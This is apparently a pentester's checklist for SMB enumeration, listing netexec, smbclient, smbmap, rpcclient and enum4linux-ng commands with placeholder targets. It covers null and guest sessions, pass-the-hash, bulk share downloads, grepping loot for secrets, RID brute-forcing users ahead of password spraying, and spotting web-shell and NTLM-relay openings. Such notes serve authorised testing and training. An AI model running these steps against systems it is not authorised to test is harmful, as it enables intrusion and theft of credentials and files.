# SMB enumeration

## Shares without a credential
Null session first, then guest with an empty password.
nxc smb <TargetIP> -u '' -p '' --shares
nxc smb <TargetIP> -u 'guest' -p '' --shares
smbclient -N -L //<TargetIP>
smbmap -H <TargetIP> -u '' -p ''
- [ ] Refused both ways: try every credential I find later, here first

## Shares with a credential
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --shares
nxc smb <TargetIP> -d <Domain> -u '<Username>' -H <Hash> --shares
smbmap -H <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
- [ ] READ, WRITE on a web root: somewhere to put a web shell
- [ ] READ, WRITE on ADMIN$ or C$: I am a local administrator

## Browse a share and take everything
smbclient '//<TargetIP>/<Share>' -U '<Domain>/<Username>%<Password>'
smbclient -N '//<TargetIP>/<Share>'
Inside smbclient, to download the whole share:
recurse ON
prompt OFF
mget *
Or every readable share at once, into the current folder:
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
Then search what came down:
grep -rniE 'passw|user|key|secret|connectionstring' .
- [ ] web.config, unattend.xml, scripts, .kdbx vaults, SSH keys, backups

## Users, groups and the password policy
nxc smb <TargetIP> -u '' -p '' --pass-pol
nxc smb <TargetIP> -u 'guest' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f2 > users.txt
rpcclient -U '' -N <TargetIP> -c querydispinfo
rpcclient -U '<Domain>/<Username>%<Password>' <TargetIP> -c querydispinfo
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>' --users --groups
- [ ] Every user's description read: passwords turn up there
- [ ] The lockout threshold noted before any spraying

## One broad pass
enum4linux-ng -A <TargetIP> -oA e4l
enum4linux-ng -A <TargetIP> -u '<Username>' -p '<Password>' -oA e4l-auth

## Where this credential works
nxc smb <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc winrm <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc rdp <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc mssql <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc smb <TargetIP> -u '<Username>' -p '<Password>' --local-auth
- [ ] (Pwn3d!) means local administrator on that host
- [ ] signing:False on a host: a candidate for NTLM relay

## An old server that refuses to talk
smbclient -N -L //<TargetIP> --option='client min protocol=NT1'
